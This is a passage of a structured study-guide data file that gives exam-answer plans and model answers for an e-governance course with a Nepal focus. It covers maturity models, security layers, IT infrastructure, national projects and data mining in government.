availability.\n• Security infrastructure: firewalls, CERT, PKI.\n• Standards and data infrastructure: interoperability, registries, warehouse.\n• Affordability: cost of data and devices against income.\nHow it is measured: composite indices — UN E-Government Development Index (telecom infrastructure, human capital, online services), ITU ICT Development Index, Networked Readiness Index.\nNepal: mobile coverage is wide, but fixed broadband, rural bandwidth, reliable power and local hosting remain weak. Hence mobile-first design and shared national hosting."},"egov-44":{"u":6,"logic":"Tests whether you know Nepal's real position rather than reciting theory; examiners want named live systems plus honest gaps, not a wish list.","how":"Open with the maturity level Nepal sits at, then four bullets — law, identity, departments, local bodies — and one gap line.","skel":["Nepal sits at interactive stage","Legal base: ETA 2063, Digital Nepal Framework","National ID, Nagarik App, connectIPS","Department systems: IRD, OCR, passport, land","Gaps: silos, connectivity, literacy, data law"],"ans":"Nepal is today an interactive-stage e-governance country: information and forms are online, only a few services are fully transactional.\n• Legal base: Electronic Transactions Act 2063, ICT Policy 2072, Digital Nepal Framework 2076, Cyber Security Policy 2077.\n• Identity and payment: National ID enrolment, Nagarik App for citizen documents, connectIPS and wallets for bills and taxes.\n• Department systems: IRD e-filing, OCR online company registration, e-passport with online appointment, computerised land revenue offices.\n• Local level: municipal tax and billing software, school e-attendance, Hello Sarkar grievances.\n• Gaps: silos with little interoperability, weak rural connectivity, low digital literacy, no data-protection law, pilot-heavy projects."},"egov-45":{"u":3,"logic":"Probes whether you can classify tools into channels, back office and shared utilities instead of listing random software names.","how":"Group into channel, back office, integration, identity, payment, hosting — six headings, one line each, then one service as example.","skel":["Group tools, do not list randomly","Channels: portal, app, kiosk, SMS, IVR","Back office: database, workflow, ERP, GIS","Integration: APIs, middleware, single sign-on","Identity, payment, cloud, analytics, grievance"],"ans":"IT tools are the access channels, back-office systems and shared utilities through which government delivers a service.\n• Access channels: web portal, mobile app (Nagarik App), common service centre or kiosk, SMS and IVR, call centre, digital TV.\n• Back office: database, document management, workflow/BPM engine, ERP, GIS for location-based services.\n• Integration: APIs, middleware or ESB, single sign-on, so departments can share data.\n• Identity and trust: national ID, digital signature with PKI, biometric verification.\n• Payment: payment gateway, connectIPS, wallet and card integration.\n• Support: data centre or cloud hosting, analytics, grievance or CRM system, SMS gateway.\nA single service such as passport renewal uses nearly all of these together."},"egov-46":{"u":4,"logic":"Checks that you understand defence in depth as layers of controls, not a single firewall; the diagram is where most marks sit.","how":"Draw eight stacked layers, name two controls per layer, and add one line on why layers beat one big control.","skel":["Define defence in depth in one line","Draw eight layers as a stack","Physical, network, host, application","Data, identity, monitoring, policy","Close with standards and ETA 2063"],"ans":"E-government security architecture is a layered, defence-in-depth design in which every layer carries its own controls, so the failure of one does not expose citizen data.\n• Physical: data-centre access control, CCTV, guards, fire suppression.\n• Network: firewall, IDS/IPS, VPN, segmentation, DDoS protection.\n• Host/OS: patching, hardening, antivirus, least privilege.\n• Application: secure coding, input validation, authentication, session control.\n• Data: encryption at rest and in transit, masking, backup, retention.\n• Identity and access: SSO, MFA, RBAC, PKI and digital signature.\n• Monitoring and audit: SIEM, logs, incident response, forensics.\n• Policy and people: acceptable-use policy, training, background checks.\nDraw the layers as a stack with ISO 27001 standards binding them; in Nepal the Electronic Transactions Act 2063 supplies the legal backing."},"egov-47":{"u":6,"logic":"A pure recall case study; the examiner wants specific programme names, not generic praise of ICT in a developing country.","how":"Name e-Sri Lanka once, then five components — network, registry, portal, telecentres, sectors — and end with one lesson for Nepal.","skel":["e-Sri Lanka, World Bank funded","Lanka Government Network links offices","e-population registry: one citizen record","e-services portal and Nenasala telecentres","Lesson for Nepal in last line"],"ans":"Sri Lanka's e-governance drive is the World Bank funded e-Sri Lanka programme, run through a central ICT agency.\n• Lanka Government Network (LGN): one network linking ministries, departments and district secretariats.\n• e-Population registry: computerised birth, death and marriage registration, giving one authoritative citizen record.\n• e-Services portal: government information, forms and applications from a single entry point.\n• Nenasala telecentres: rural access points offering internet, e-mail and e-services to villagers.\n• Sector programmes: e-health, e-education content, and online land and business registration.\nOutcome: one entry point and rural access instead of isolated departmental websites. Lesson for Nepal: a central agency, one network, one citizen record and rural telecentres matter more than many separate portals."},"egov-48":{"u":3,"logic":"The sub-topics come from unit 3 and unit 2, so it tests recall across units; students lose marks by writing one note at length.","how":"Three short heads of about four lines each — registry/standards, the five models, standards list — split the marks evenly.","skel":["Head each note separately","Data system: registries, standards, warehouse, backup","Digital governance models: name all five","Security standards: ISO 27001, NIST, OWASP","Keep each note to four lines"],"ans":"Data system infrastructure: the registries, standards and stores that hold government data — citizen, land and business registries, metadata and data-quality standards, data warehouse, backup and open-data portal. Without it, front-end portals have nothing reliable to serve.\nModel of digital governance: the five textbook models describing how information flows — broadcasting or wider dissemination, critical flow, comparative analysis, mobilization and lobbying, and interactive service (G2C2G). They classify a project by direction and purpose.\nSecurity standards: documented benchmarks such as ISO/IEC 27001 for an information security management system, ISO 27002 controls, the NIST cybersecurity framework and OWASP for applications. They make security auditable instead of ad hoc."},"egov-49":{"u":1,"logic":"Asks for justification, not description; the marks are for linking each benefit to a failure of manual government and closing with a named case.","how":"Write the four failures of manual service first, then five benefit bullets, then one Bhoomi example. Add the manual-versus-e flow sketch.","skel":["Manual fails on distance, delay, discretion, duplication","Five benefit bullets, one line each","Bhoomi or IRD as the example","Draw manual flow versus e-flow","Close on trust and inclusion"],"ans":"Manual government fails on four counts — distance, delay, discretion and duplication — and e-governance is necessary because it attacks all four at once.\n• Access: a citizen in a remote district is served through a portal, kiosk or phone instead of travelling to the district headquarters.\n• Speed and cost: workflow software removes file movement between desks, so a certificate takes minutes and costs the state less.\n• Transparency: published rules, status tracking and audit trails shrink the middleman's room to charge.\n• Accountability and data: every transaction leaves a record, so delay can be traced and planning uses real figures.\n• Inclusion and trust: SMS alerts, local-language screens and grievance channels reach citizens who never visit an office.\nExample: Karnataka's Bhoomi lets a farmer print the record of rights from a kiosk instead of waiting weeks for the talathi; Nepal's IRD e-filing and e-passport appointment do the same for tax and passports. Draw the manual flow and the electronic flow side by side."},"egov-50":{"u":2,"logic":"Tests two things at once — why models exist as an analytical device, and depth on two participation-oriented models that students usually only name.","how":"One line on why models help, then each model as mechanism, example, strength, limit. Comparative uses evidence; mobilization uses numbers.","skel":["Why models: direction and purpose of flow","Comparative: compare and publish, creates pressure","Example: district pass rates, report cards","Mobilization: e-petition, coalition, consultation","One strength and one limit for each"],"ans":"Why models: a model names the direction of information flow and the purpose of a project, so government can choose a design and judge maturity instead of building another static website.\nComparative analysis model: government data is compared across districts, departments or years and published, so weak performance is exposed by comparison rather than accusation.\n• Mechanism: choose comparable indicators, normalise them, publish rankings or report cards, let media and citizens react.\n• Example: district-wise SEE pass rates, municipal budget comparisons, hospital performance tables, citizen report cards.\n• Strength: cheap, evidence-based, uses rivalry rather than coercion.\n• Limit: needs credible like-for-like data, else it punishes poor districts for being poor.\nMobilization and lobbying model: ICT organises citizens into a collective voice that lobbies decision-makers — e-petitions, social-media campaigns, online consultation on a draft bill, signature drives.\n• Strength: agenda setting and inclusion of dispersed groups.\n• Limit: needs legal protection and can be captured by loud minorities.\nBoth are demand-side models: comparative analysis applies evidence, mobilization applies numbers."},"egov-51":{"u":3,"logic":"Expects infrastructure as a layered base with a reason for each layer; answers that just list servers and cables miss the why.","how":"One paragraph on why shared infrastructure beats departmental islands, then six labelled bullets, then Nepal's data centre as proof.","skel":["One paragraph: why shared base matters","Network, computing, data centre","Data registries and interoperability","Security, power, skilled staff","Name NGIDC as local example"],"ans":"IT infrastructure is the shared base — connectivity, computing, data and standards — on which every e-government service runs. Without it each department builds an island: duplicated servers, incompatible data, and services that stop at the ministry gate.\n• Network: national fibre backbone, broadband and last-mile links, LAN/WAN, intranet, internet gateway and redundancy.\n• Computing: servers, virtualisation, cloud (IaaS, PaaS, SaaS), storage and backup.\n• Data centre: central hosting with power, cooling, physical security and a disaster-recovery site; Nepal's NGIDC is the local example.\n• Data: citizen, land and business registries, data warehouse, metadata standards.\n• Interoperability: APIs, middleware, unique identifiers, single sign-on.\n• Security and people: firewalls, PKI, CERT, trained administrators — plus reliable electricity in rural offices.\nPrioritise connectivity and the data centre first, because portals and apps are only front ends."},"egov-52":{"u":1,"logic":"A justification question hiding an acronym; the examiner wants the SMART expansion and a mechanism for each letter, not adjectives.","how":"Expand SMART in the first line, then one mechanism per letter, then a closing sentence that ties the five together.","skel":["Expand SMART in line one","Simple: one form, one window","Moral: rules in code cut discretion","Accountable and responsive: logs, tickets","Transparent: publish budget, tenders, status"],"ans":"SMART government means Simple, Moral, Accountable, Responsive and Transparent government, and e-governance supplies the mechanism for each letter.\n• S — Simple: one form and one window, with no repeated submission; Nagarik App keeps citizen documents in one place.\n• M — Moral: rules are encoded in software, so eligibility and fees are computed and discretion shrinks.\n• A — Accountable: every action is logged, so a delay can be traced to an officer and audited.\n• R — Responsive: grievance tickets with fixed timelines, as in Hello Sarkar, force a reply.\n• T — Transparent: budgets, tender notices, beneficiary lists and service status are published.\nThe statement is therefore justified: e-governance does not merely computerise existing work, it institutionalises the five SMART qualities through data, workflow and publication."},"egov-53":{"u":1,"logic":"Tests the project life cycle, not the maturity ladder; the common error is to answer with information-interaction-transaction stages.","how":"Six numbered phases in order, one line each, drawn as a loop because evaluation feeds the next version.","skel":["Define life cycle as phases, not levels","Initiation: vision, feasibility, e-readiness","Planning and design: re-engineer, architect","Implementation, then operation","Monitoring, then improvement loops back"],"ans":"The e-government life cycle is the sequence of phases a project passes through from idea to continuous improvement; it is a cycle because evaluation feeds the next version.\n1. Initiation: vision, political sponsorship, feasibility and e-readiness study.\n2. Planning and design: service selection, process re-engineering, architecture, standards, budget and legal check.\n3. Implementation: development or procurement, data migration, integration, testing and pilot.\n4. Operation and service delivery: rollout, training, help desk, citizen awareness, payment and identity integration.\n5. Monitoring and evaluation: usage, cost, service time, satisfaction and audit.\n6. Improvement and expansion: fix gaps, add services, extend to other districts, integrate with other departments.\nDraw it as a loop. Most Nepali projects stall between phase three and four for want of training and back-office reform."},"egov-54":{"u":2,"logic":"A guaranteed five-level ladder question; marks are lost by mixing levels 2 and 3 or forgetting the integration point of level 5.","how":"Draw a five-step staircase first, label each step, then write one line per level and place Nepal at the end.","skel":["Draw five-step staircase","Emerging: static, one-way","Enhanced: searchable, downloadable","Interactive then transactional","Connected: integrated, single window"],"ans":"The e-government maturity model ranks a government by how much of the service chain it has put online, from publishing information to integrating whole processes.\n1. Emerging (information): static website with acts, notices and contacts — one-way.\n2. Enhanced: larger content, searchable databases, downloadable forms, still one-way.\n3. Interactive: two-way — e-mail, online forms, status queries, simple transactions begin.\n4. Transactional: the whole transaction happens online — payment, certificate or licence issue — with secure authentication and digital signature.\n5. Connected (seamless): departments integrated, single window, data entered once, proactive and participatory services.\nIntegration, personalisation, security, back-office reform and participation rise with each level. Draw it as a five-step staircase. Nepal is largely at level three, with islands of level four such as IRD e-filing and e-passport."},"egov-55":{"u":2,"logic":"Wants the mapping of model to governance principle; a list of governance principles with no model attached earns little.","how":"Take the five models as the headings and attach one governance principle plus one mechanism to each; add audit trails at the end.","skel":["Name the governance principles briefly","Broadcasting gives transparency","Critical flow gives accountability","Comparative gives effectiveness, mobilization participation","Interactive service gives responsiveness"],"ans":"Good governance means transparency, accountability, participation, responsiveness, effectiveness, rule of law and equity; each model supplies one.\n• Broadcasting → transparency: published budgets, the red book, tender notices, SMS alerts.\n• Critical flow → accountability: asset declarations, audit reports and RTI disclosures reach journalists, courts and watchdogs.\n• Comparative analysis → effectiveness: district rankings and report cards expose poor performance.\n• Mobilization and lobbying → participation: e-petitions and consultation on draft laws give citizens an agenda-setting voice.\n• Interactive service → responsiveness: online applications, payments and tracked grievances produce a measurable reply.\nAudit trails enforce the rule of law; multi-channel local-language access delivers equity."},"egov-56":{"u":3,"logic":"Two-part definition question; the legal half is where marks are lost because students name only the Electronic Transactions Act.","how":"Two sentences on e-readiness, then five bullets of legal preparedness, each naming a law or mechanism rather than a slogan.","skel":["Define e-readiness with its dimensions","Legal preparedness definition","ETA 2063: e-records, signature, offences","Evidence, privacy, RTI, cyber security policy","Why trust and enforceability depend on it"],"ans":"E-readiness is how far a country has the infrastructure, skills, affordability, content and legal framework for the digital economy; the UN EGDI measures it.\nLegal infrastructural preparedness is the body of law that makes electronic transactions and digital government lawful, enforceable and trustworthy:\n• Electronic Transactions Act 2063 — recognises electronic records and digital signatures and defines computer-related offences.\n• Rules on admissibility of electronic evidence, authentication and record retention.\n• Cyber Security Policy 2077 with CERT arrangements for incident response.\n• Right to information, privacy protection and a data-protection law, still pending in Nepal.\n• Procurement, IT audit and e-waste rules, plus a forum for electronic disputes.\nWithout this layer a citizen cannot trust an online certificate and an officer cannot defend an electronic decision in court."},"egov-57":{"u":4,"logic":"Tests breadth of threat awareness across technical, insider and legal dimensions; a list of only hacking and viruses is a half answer.","how":"Group into data, criminal, insider, legacy, capacity and legal — six heads of two lines each gives full coverage fast.","skel":["Group threats, do not list randomly","Privacy and identity theft","Cybercrime: DoS, ransomware, malware","Insider, legacy systems, sharing risk","Capacity and legal gaps, availability"],"ans":"E-government must protect large linked databases while keeping services available, so the challenges are technical and institutional.\n• Privacy: one national ID links tax, health and land data, so a single breach exposes everything.\n• Identity theft: weak authentication lets someone file returns or claim benefits as another person.\n• Cybercrime: hacking, defacement, denial of service, ransomware and malware on portals and data centres.\n• Insider threat: privileged officials and vendors can alter land and revenue records.\n• Legacy systems: unsupported software and unpatched servers in district offices.\n• Inter-agency sharing: data moved over weak links, e-mail or pen drive.\n• Capacity and legal gaps: scarce security staff, no data-protection law, unclear jurisdiction and evidence handling.\n• Availability: services must run round the clock, yet social engineering defeats untrained staff."},"egov-58":{"u":5,"logic":"Tests whether you can name mining techniques against concrete farm decisions; generic benefits without technique names score poorly.","how":"One line on what the warehouse collects, then five bullets each pairing a technique with a farm decision.","skel":["Warehouse: soil, weather, yield, price, subsidy","Forecast yield with regression and classification","Pest alerts from association rules","Suitability clustering, subsidy leakage outliers","Price forecasting for selling decisions"],"ans":"Agriculture's scattered data — soil, weather, crop, subsidy and market price — becomes advice through a warehouse and mining.\nWarehouse: integrates ministry, district agriculture, weather-station, cooperative and market-yard data and keeps years of history.\n• Yield forecasting: regression on rainfall, soil, fertiliser and past yield predicts output by crop and district.\n• Pest alerts: association rules link weather patterns to outbreaks, triggering SMS advisories.\n• Crop suitability: clustering of soil and climate zones recommends crops and places extension staff.\n• Subsidy targeting: outlier and duplicate analysis finds ineligible or repeated farmers.\n• Market intelligence: price forecasting from mandi history helps farmers time the sale.\nNepal example: a warehouse of cereal production and prices would let the ministry plan imports instead of reacting to shortages."},"egov-59":{"u":6,"logic":"Pure recall of named national projects; vague answers about digital Nepal without project names cannot reach full marks.","how":"Nine bullets, each one project plus one clause of what it does, grouped as identity, revenue, land, grievance, infrastructure, policy.","skel":["Identity: National ID, Nagarik App","Passport, IRD e-filing, OCR registration","Land revenue computerisation, Land Bank","Hello Sarkar, NGIDC, fibre backbone","Digital Nepal Framework, ETA 2063"],"ans":"Nepal's e-government initiatives run across identity, service delivery, revenue and local government.\n• National ID: biometric identity card intended as the single citizen identifier.\n• Nagarik App: one mobile front end for citizen documents.\n• e-Passport: machine-readable passports with online form and appointment.\n• Revenue: IRD e-filing with e-payment, and OCR online company registration.\n• Land: computerised land revenue offices and the Land Bank system, following Bhoomi.\n• Grievance: Hello Sarkar and ministerial complaint portals.\n• Infrastructure: Nepal Government Integrated Data Centre and the national fibre backbone.\n• Local level: municipal tax, billing and birth-death registration software in the Smart Nagarpalika pattern.\n• Policy: Digital Nepal Framework 2076, ICT Policy 2072, Cyber Security Policy 2077, Electronic Transactions Act 2063.\nImpact is real but uneven: transactional pockets inside an informational system."},"egov-60":{"u":4,"logic":"Pairs a security diagram with a case study, so it tests both units at once; students often write only the case study.","how":"Half the space for the eight layers, half for land reform with Bhoomi plus Nepal, one line each on benefits and risks.","skel":["Security architecture: eight layers, two controls each","Land reform: computerise records, end talathi dependence","Bhoomi: records and RTC from kiosks","Nepal: land revenue offices print records","Benefits and risks in the last two lines"],"ans":"E-government security architecture: a layered defence-in-depth stack — physical (data-centre access), network (firewall, IDS, VPN), host (patching, hardening), application (secure coding, authentication), data (encryption, backup), identity (SSO, MFA, PKI), monitoring (SIEM, incident response) and policy with people (training, acceptable use). Each layer assumes the others may fail.\nE-governance in land reform: computerising land records to end dependence on the patwari or talathi and paper registers. Karnataka's Bhoomi put over twenty million records online and issues the record of rights from kiosks; Nepal's land revenue offices now print records and receipts electronically. Benefits: tamper-evident records, tracked mutation, faster registration, fewer boundary disputes, online revenue and a land bank for planning. Risks: faulty legacy data entered at speed, insider editing, and exclusion of citizens who cannot use a kiosk."},"egov-61":{"u":1,"logic":"Repeats egov-49 from a different paper; the examiner wants the same necessity logic plus a clear how, so it is a certain question.","how":"Split the page: why on the left as four failures, how on the right as four mechanisms, then e-Seva or Nagarik App as the example.","skel":["Manual fails on distance, delay, discretion, data","Geography and volume as Nepali reasons","How: single window, multi-channel, rules in code","Tracked grievance and service standards","Example: e-Seva or Nagarik App"],"ans":"Manual service delivery breaks down on distance, delay, discretion and duplication; e-governance is needed because it removes all four where citizen and state meet.\nWhy we need it:\n• Geography: settlements scattered across hills and mountains make a district-centre trip cost a day and a day's wage.\n• Volume and delay: queues, manual registers and file movement turn a simple certificate into several visits.\n• Corruption: an officer who alone knows the rule can charge for it, while published rules and system-calculated fees cut that power.\n• Planning: registers cannot be aggregated, so policy runs on guesswork.\nHow it delivers efficiently:\n• Single window with internal workflow — one counter, one form.\n• Multi-channel access: portal, app, kiosk, SMS, call centre, so nobody is forced online.\n• Eligibility, fee and status computed by software, with an audit trail.\n• Tracked grievance and published service standards that force a reply.\nExample: Andhra Pradesh's e-Seva gives bills, certificates and reservations at one urban counter; Nepal's Nagarik App and IRD e-filing follow the same logic. Draw one service as manual flow against e-flow."},"egov-62":{"u":2,"logic":"Contrast question: both models push information out, so the exam tests whether you can separate wide reach from targeted consequence.","how":"Half page each using mechanism, examples, strength, weakness, then one closing line on the difference.","skel":["Broadcasting: one-to-many push, cheap","Examples: budget, results, disaster SMS","Critical flow: targeted at watchdogs","Examples: asset declarations, tenders, audit","Difference: reach versus consequence"],"ans":"An e-governance model describes the direction of information flow and what the flow is meant to achieve.\nBroadcasting or wider dissemination model: government pushes information outward to a wide audience, one-to-many.\n• Tools: website, portal, SMS alerts, radio and television, social media, open-data page.\n• Examples: publishing the budget and red book, SEE results, disaster warnings, immunisation schedules.\n• Strength: cheap, instant and unlimited in reach; it is the base of every other model.\n• Weakness: one-way, no feedback, and overload when everything is published equally.\nCritical flow model: high-value, sensitive information is channelled deliberately to those who can act — media, auditors, courts, watchdogs and affected citizens.\n• Examples: asset declarations of ministers and MPs, tender and contract documents, audit reports, pollution data, RTI disclosures.\n• Purpose: expose wrongdoing and enable sanction, so information becomes a lever rather than a notice.\n• Strength: strong accountability at low cost. Weakness: needs legal protection for whistle-blowers and a capable media.\nDifference: broadcasting widens reach; critical flow concentrates on consequence. Hello Sarkar sits later, in the interactive model."},"egov-63":{"u":3,"logic":"Narrows infrastructure to two families, so breadth alone is not enough; each family needs sub-components and a Nepali reference.","how":"Short why paragraph, then network and computing as two headed lists with four sub-points each, ending on NGIDC and fibre.","skel":["Why: e-government is a chain, weakest link decides","Network: backbone, last mile, LAN, gateway","Redundancy, bandwidth, security appliances","Computing: servers, virtualisation, cloud, storage","Data centre, devices, service desk, NGIDC"],"ans":"IT infrastructure is needed because e-government is a chain — identity, data, workflow, payment and delivery — and the weakest link sets the service level. Without shared infrastructure every office becomes a silo with its own server and standards, and no service can cross a departmental boundary.\nNetwork infrastructure:\n• National fibre backbone with provincial links, and microwave or satellite for remote districts.\n• Last-mile broadband and mobile data so offices and citizens can connect.\n• LAN/WAN and intranet inside and between offices, with adequate bandwidth.\n• Internet gateway, DNS, redundancy and security appliances such as firewall, IDS and DDoS protection.\nComputing infrastructure:\n• Servers and virtualisation in a central data centre, with cloud IaaS, PaaS or SaaS options.\n• Storage, backup and a disaster-recovery site.\n• End-user devices, printers, biometric readers and kiosks at the counter.\n• Service desk, monitoring and skilled administrators.\nNepal's NGIDC and the government fibre backbone are the local expression; without them portals stay brochures."},"egov-64":{"u":1,"logic":"Wants the systems view — input, process, output, feedback and the five components — not another definition of e-government.","how":"Definition in one line, draw the four-box cycle, then label people, process, technology, data and policy on the diagram.","skel":["Define e-government with G2C, G2B, G2G, G2E","Draw input-process-output-feedback","Name the five components","Passport as the running example","One line on why the systems view matters"],"ans":"E-government is the use of ICT, especially the internet, by government to deliver information and services to citizens, businesses and other agencies (G2C, G2B, G2G, G2E).\nAs an information system it follows the standard input–process–output–feedback cycle:\n• Input: applications, citizen data, land and tax records, payments, field and sensor data.\n• Process: validation, workflow, business rules, approvals and database updates.\n• Output: certificates, receipts, licences, payments, information and status messages.\n• Feedback: complaints, usage logs, audits and satisfaction surveys that correct the process.\nComponents: people (citizens and officials), processes, technology, data, and the policy and legal framework.\nExample: a passport application takes form and biometrics as input, verifies and schedules as process, issues the passport as output, and routes complaints back. Draw the cycle with the five components labelled."},"egov-65":{"u":1,"logic":"Probes the case for ICT beyond cost saving; answers that only say faster service miss transparency, coordination and inclusion.","how":"Eight one-line bullets grouped as reach, cost, transparency, accountability, data, coordination, inclusion, competitiveness.","skel":["Reach: one channel, every district","Speed and cost per transaction","Transparency and audit trail","Data for planning, coordination across ministries","Inclusion through kiosk, SMS, local language"],"ans":"ICT changes what the state can do at scale.\n• Reach: one portal or SMS reaches every district at once.\n• Speed and cost: workflow and e-payment cut service time and the cost per transaction.\n• Transparency: published rules, status tracking and audit logs shrink discretion and corruption.\n• Accountability: grievance systems with ticket numbers make official silence visible.\n• Better decisions: aggregated registry data supports planning, budgeting and targeting.\n• Coordination: shared databases and APIs end repeated data entry across ministries.\n• Inclusion: kiosks, SMS, IVR and local-language screens serve citizens who are not online.\n• Competitiveness: e-procurement, e-trade and digital payments lower the cost of doing business.\nNepal's Hello Sarkar and IRD e-filing show the logic: fewer counters, more records. ICT is the means, service the end."},"egov-66":{"u":2,"logic":"Exact repeat of egov-54, so this is the safest question in the paper; the examiner checks the five levels and their characteristics.","how":"Same staircase, tighter: five numbered levels, one line each, Nepal's position last. It repeats, so treat it as a sure shot.","skel":["Draw five-step staircase","Emerging and enhanced: one-way","Interactive: two-way forms","Transactional: payment, signature","Connected: integrated single window"],"ans":"The maturity model ranks e-government by how much of the service chain is online.\n1. Emerging: static information, one-way, no interaction.\n2. Enhanced: searchable content and downloadable forms, still one-way.\n3. Interactive: two-way forms, e-mail and status queries.\n4. Transactional: complete online transaction with payment and secure authentication.\n5. Connected: cross-department integration, single window, data entered once, proactive and participatory services.\nIntegration, personalisation, security and back-office reform rise with each level. Draw the five-step staircase and mark where Nepal stands — level three, with pockets of level four in tax and passports."},"egov-67":{"u":2,"logic":"Repeats egov-55; the examiner wants model-to-principle mapping, and many students answer with principles only.","how":"Five bullets, model then principle then mechanism. It repeats from 2079, so memorise this mapping once and reuse it.","skel":["List the governance principles in one line","Broadcasting gives transparency","Critical flow gives accountability","Comparative gives effectiveness","Mobilization participation, interactive responsiveness"],"ans":"Good governance rests on transparency, accountability, participation, responsiveness, effectiveness, rule of law and equity. Each model serves one:\n• Broadcasting gives transparency — published budgets, tenders, results and SMS alerts.\n• Critical flow gives accountability — asset declarations, audit reports and RTI data reach those who can act.\n• Comparative analysis gives effectiveness — district rankings and report cards pressure poor performers.\n• Mobilization and lobbying give participation — e-petitions and online consultation on bills.\n• Interactive service gives responsiveness — online applications, payments and tracked grievances.\nTwo enablers cut across: audit trails enforce rule of law, multi-channel local-language access delivers equity. A municipality that publishes its budget, ranks wards on complaints and takes tax online practises all five at once."},"egov-68":{"u":3,"logic":"Two named preparedness types, often confused with each other; the examiner looks for data quality on one side and standards on the other.","how":"One-line e-readiness definition, then two headed lists — data system and technological — four points each.","skel":["Define e-readiness in one line","Data system: registries and identifiers","Data quality, standards, warehouse, open data","Technological: open standards, interoperability","Localisation, legacy migration, security"],"ans":"E-readiness is preparedness in infrastructure, affordability, skills, content, law and government adoption.\nData system infrastructural preparedness is the supply of trustworthy data:\n• Registries: citizen or national ID, land, business and vehicle, with unique identifiers.\n• Standards: data definitions, metadata, coding and exchange formats.\n• Data quality: validation and de-duplication of legacy records.\n• Storage and use: data warehouse, backup, disaster recovery and open-data portal.\nTechnological infrastructural preparedness is the supply of appropriate technology:\n• Open standards and interoperability instead of proprietary lock-in.\n• Localisation into Nepali and accessibility for disabled users.\n• Migration from legacy systems with a maintenance and sustainability plan.\n• Security technology — PKI, encryption, monitoring — and cloud governance with data-residency rules.\nTogether they decide whether portals have clean data and usable technology."},"egov-69":{"u":4,"logic":"Tests whether security is understood as a management approach rather than a product list; naming standards earns easy marks.","how":"Six bullets, each an approach plus one tool or standard, closing with the point that approaches are combined.","skel":["Defence in depth across layers","Risk-based: threat times vulnerability times impact","Policy, technology, people, process together","ISO 27001, NIST, COBIT, OWASP","PDCA cycle, PKI, legal and supply chain"],"ans":"Approaches to e-government security combine several lenses rather than one product.\n• Layered defence in depth: controls at every layer, so one failure is contained.\n• Risk-based: identify assets, estimate risk as threat × vulnerability × impact, then fund controls where risk is highest.\n• Policy–technology–people–process: technology fails without rules, training and procedures.\n• Standards: ISO/IEC 27001 for an ISMS, ISO 27002, NIST CSF, COBIT, OWASP for applications.\n• Life-cycle (PDCA) management: plan controls, implement, monitor, audit, improve.\n• Identity-centric: PKI, digital signature and MFA under the Electronic Transactions Act 2063, so transactions are trustworthy.\n• Legal and compliance: cybercrime law, data protection, mandatory audit and incident reporting.\n• Supply-chain assurance: SLAs, security clauses and vendor audits.\nName at least four and link them to citizen trust."},"egov-70":{"u":5,"logic":"Three named sectors force specific applications; a general essay on data mining benefits scores about half.","how":"Three headed blocks — health, education, rural — three bullets each, one technique named per bullet.","skel":["Health: surveillance, immunisation, hospital performance","Health: outbreak prediction from climate data","Education: enrolment, dropout, teacher deployment","Rural: beneficiary selection, leakage detection","Rural: infrastructure gap mapping"],"ans":"A warehouse integrates scattered sector records into one history; mining finds patterns for decisions.\nHealth:\n• Disease surveillance: integrate hospital and laboratory reports to spot outbreaks and map hotspots.\n• Immunisation coverage and dropout by district and age group.\n• Hospital performance: occupancy, waiting time, drug stock, cost per case.\n• Prediction: regression on climate and past cases forecasts seasonal outbreaks.\nEducation:\n• Enrolment, dropout and repetition by school, ward and gender to target scholarships.\n• Teacher deployment from pupil–teacher ratios and school performance comparison.\nRural development:\n• Beneficiary selection and de-duplication for social security and subsidies.\n• Leakage detection: gaps between sanctioned and delivered amounts.\n• Infrastructure gap mapping — which wards lack road, water or connectivity.\nNepal example: linking health reports with census data makes immunisation targeting possible."},"egov-71":{"u":6,"logic":"Asks how software supports government, so each function needs an administrative benefit attached, not just a module name.","how":"Six bullets, each a function plus its governance gain; close with ghost employees and merit-based transfers.","skel":["One authoritative employee record","Establishment control: sanctioned versus filled","Attendance, leave, payroll, pension","Transfer, promotion, appraisal, training","Gains: no ghost staff, merit transfers"],"ans":"HRMIS supports e-government by putting civil-service people data and transactions into one trusted system.\n• Personnel records: one authoritative employee file — post, qualification, service history, training.\n• Establishment control: sanctioned versus filled posts, so vacancy shows by office.\n• Attendance and leave: biometric or app-based attendance, online leave with automatic balance.\n• Payroll and pension: salary, allowances, deductions and pension computed and paid through the treasury system.\n• Transfer and promotion: rule-based decisions with published transfer lists.\n• Performance and training: recorded targets, appraisal ratings and training needs.\n• Self-service and dashboards: staff see payslips; ministers see vacancy, absenteeism and wage cost.\nGains: ghost employees and proxy attendance shrink, transfers become merit-based, salaries are timely, planning uses real data. Nepal's civil-service HRMIS follows this model."},"egov-72":{"u":6,"logic":"One conceptual note and one case study, so it tests definition plus a named application area; students often conflate the two.","how":"Two short blocks: electronic delivery as the wider channel set with online as subset; then five judiciary functions.","skel":["Electronic delivery: any electronic channel","Online is a subset; kiosk, SMS, IVR, CSC","Elements: front end, back office, ID, payment","Judiciary: case status, cause list, e-filing","Judiciary: VC, digitised judgements, copies"],"ans":"Electronic service delivery: delivering a government service through any electronic channel — portal, mobile app, kiosk, common service centre, SMS, IVR, call centre or digital TV. Online delivery over the internet is only a subset of it. Elements: a citizen front end, back-office workflow, database, identity verification and payment. Examples: Andhra Pradesh's e-Seva counters, Ekal Seva Kendra in Gujarat, Nepal's Nagarik App and Hello Sarkar. Advantage: reach beyond internet users; risk: kiosk operators becoming new middlemen.\nIT in judiciary: computerising the courts — e-courts with case registration, cause lists, case status, e-filing, digitised judgements, video conferencing and online certified copies. Benefits: fewer adjournments and lost files, status without a court visit, and virtual hearings for remote districts. Nepal's Supreme Court case-management system and virtual hearings follow this model."},"egov-73":{"u":1,"logic":"Two-part ten-mark question: the comparison is easy marks, but the stages half is often answered with maturity levels instead of evolution stages.","how":"Five contrast bullets first, then six evolution stages as a ladder. Keep the two concepts visually separate on the page.","skel":["Five contrast points: scope, focus, actors, nature, example","Stages are evolution, not maturity levels","Computerisation, networking, information","Interaction, transaction, transformation","Draw as a ladder, place Nepal on it"],"ans":"E-government is the use of ICT by government to deliver services and information; e-governance is the wider application of ICT to the whole governing process, including participation, transparency and accountability.\n• Scope: e-government is narrow and operational; e-governance is broad and strategic.\n• Focus: efficiency of service versus quality of governance.\n• Actors: government to citizen versus government, citizens, civil society and private sector together.\n• Direction: one-way or transactional delivery versus two-way participation and feedback.\n• Example: an online passport form is e-government; publishing the budget, consulting on a bill and tracking grievances is e-governance.\nStages of e-governance (evolution):\n1. Computerisation of records — registers and files digitised internally.\n2. Networking — offices linked by e-mail and intranet, internal data sharing.\n3. Information or presence — static websites publishing rules, forms and contacts.\n4. Interaction — two-way queries, forms, e-mail and status checks.\n5. Transaction — full online service with payment 